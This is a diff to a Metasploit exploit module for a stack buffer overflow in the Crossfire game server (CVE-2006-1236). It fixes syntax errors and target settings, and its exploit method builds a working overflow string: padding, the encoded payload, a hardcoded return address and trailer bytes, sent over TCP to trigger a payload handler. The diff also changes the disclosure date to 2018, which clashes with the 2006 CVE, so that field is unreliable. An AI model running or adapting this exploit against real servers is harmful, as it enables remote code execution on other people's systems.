@@ -3,10 +3,12 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'msf/core'
 
 class Metasploit3 < Msf::Exploit::Remote
   Rank = GoodRanking
-  include Msf::Exploit::Remote
+
+  include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
     super(update_info(info,
@@ -16,7 +18,8 @@ class Metasploit3 < Msf::Exploit::Remote
         of the Crossfire application.
       },
       'Author'	=> [ 'Skjallar', 'skjallar' ],
-      'License'	=> MSF_LICENSE,
+      'Arch'        => ARCH_X86,
+      'Platform'    => 'linux',
       'References'	=>
         [
           [ 'CVE', '2006-1236' ],
@@ -24,18 +27,18 @@ class Metasploit3 < Msf::Exploit::Remote
           [ 'EDB', '1582' ]
         ],
       'Privileged'	=> false,
+      'License'	=> MSF_LICENSE,
       'Payload'	=>
         {
           'Space' => 300,
-          'BadChars' => "\x00\x0a\x0d\x20",
-        }
-      'Platform' => 'linux',
+          'BadChars' => "\x00\x0a\x0d\x20=",
+        },
       'Targets'	=>
         [
-          [ 'Kali Linux', { 'Ret' => 0x0807b918 } ],
+          [ 'linux', { 'Ret' => 0x0807b918 } ],
         ],
-      'DisclosureDate'  => 'Mar 13 2006'
       'DefaultTarget'	=> 0,
+      'DisclosureDate'  => 'Mar 15 2018'
     ))
 
     register_options(
@@ -46,9 +49,9 @@ class Metasploit3 < Msf::Exploit::Remote
     )
   end
 
-  def check
-    connect
-    disconnect
+def check
+connect
+disconnect
 
     if (banner =~ /version 1023 1027 Crossfire Server/)
       return Exploit::CheckCode::Vulnerable
@@ -60,13 +63,13 @@ class Metasploit3 < Msf::Exploit::Remote
   def exploit
     connect
 
-   sploit = "\x11(setup sound "
-   sploit << rand_text_alpha_upper(91)
-   sploit << payload.encoded
-   sploit << rand_text_alpha_upper(4277 - payload.encoded.length)  
-   sploit << [target.ret].pack('V')
-   sploit << "C" * 7
-   sploit << "\x90\x00#"
+    sploit = "\x11(setup sound "
+    sploit << rand_text_alpha_upper(91)
+    sploit << payload.encoded
+    sploit << rand_text_alpha_upper(4277 - payload.encoded.length)  
+    sploit << [target.ret].pack('V')
+    sploit << "C" * 7
+    sploit << "\x90\x00#"
    
     sock.put(sploit)
     handler
